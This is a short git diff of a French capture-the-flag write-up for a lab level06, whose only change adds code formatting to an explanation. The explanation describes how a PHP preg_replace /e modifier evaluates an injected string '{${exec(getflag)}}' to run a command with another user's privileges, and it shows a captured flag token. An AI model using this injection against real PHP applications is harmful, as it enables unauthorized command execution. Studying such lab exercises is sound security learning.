@@ -71,7 +71,7 @@ PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
 ```
 On peut utiliser le modifier e pour pouvoir executer getflag.
-Le programme va remplacer "[x {${exec(getflag)}}]" par "eval('return y("{${exec(getflag)}}");')" donc va evaluer ${exec(getflag)} avec les droits de flag06
+Le programme va remplacer ```[x {${exec(getflag)}}]``` par ```eval('return y("{${exec(getflag)}}");')``` donc va evaluer ```${exec(getflag)}``` avec les droits de flag06
 On met exec(getflag) dans une syntaxe d'interpolation car en remplacant la chaine elle devient entre guillemet.
 
 
